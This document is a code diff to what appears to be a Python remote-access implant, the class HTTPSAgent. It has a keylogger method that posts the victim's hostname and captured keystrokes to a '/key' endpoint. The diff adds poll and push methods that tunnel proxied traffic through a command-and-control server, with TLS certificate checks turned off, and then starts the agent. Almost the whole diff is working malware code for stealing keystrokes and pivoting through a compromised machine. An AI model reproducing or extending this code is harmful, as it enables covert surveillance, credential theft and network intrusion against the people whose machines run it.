@@ -29,7 +29,6 @@ class HTTPSAgent(LocalAgent):
 	def postKeylogger(self, log):
 		try:
 			payload = socket.gethostname() + "\n" + log
-			print(payload)
 			self.postHTTPS(self.headers, '/key', payload)
 		except Exception as e:
 			print("Oops, something went wrong: {}".format(e), file=sys.stderr)
@@ -67,6 +66,39 @@ class HTTPSAgent(LocalAgent):
 
 		return connection.getresponse().read().decode()    
         
+	def pollForward(self, forwardID):
+		try:    
+			localheaders = self.headers.copy()
+			localheaders['ForwardRequest'] = forwardID
+			ssl_context = ssl.create_default_context(purpose=ssl.Purpose.CLIENT_AUTH) 
+			ssl_context.check_hostname = False
+			ssl_context.verify_mode = ssl.CERT_NONE
+			connection = http.client.HTTPSConnection(self.http_server, self.http_port, context=ssl_context)
+			connection.request('GET', '/proxy', "MOAR COMMANDS", localheaders)
+			response = connection.getresponse().read().decode()
+			if response == "<No Data>":
+				return None
+			else:
+				return base64.decodebytes(response.encode('ascii'))
+		except Exception as e:
+			print("Oops, something went wrong, pollForward: {}".format(e), file=sys.stderr)
+			return None
+
+
+	def pushForward(self, forwardID, data):
+		try:
+			im_b64 = base64.b64encode(data).decode('ascii')
+			localheaders = self.headers.copy()
+			localheaders['ForwardRequest'] = forwardID
+			ssl_context = ssl.create_default_context(purpose=ssl.Purpose.CLIENT_AUTH) 
+			ssl_context.check_hostname = False
+			ssl_context.verify_mode = ssl.CERT_NONE
+			connection = http.client.HTTPSConnection(self.http_server, self.http_port, context=ssl_context)
+			connection.request('POST', "/proxy", im_b64, localheaders)
+			print(connection.getresponse().read().decode())
+		except Exception as e:
+			print("Oops, something went wrong, pushForward: {}".format(e), file=sys.stderr)
+
 
 agent = HTTPSAgent()
 agent.run()
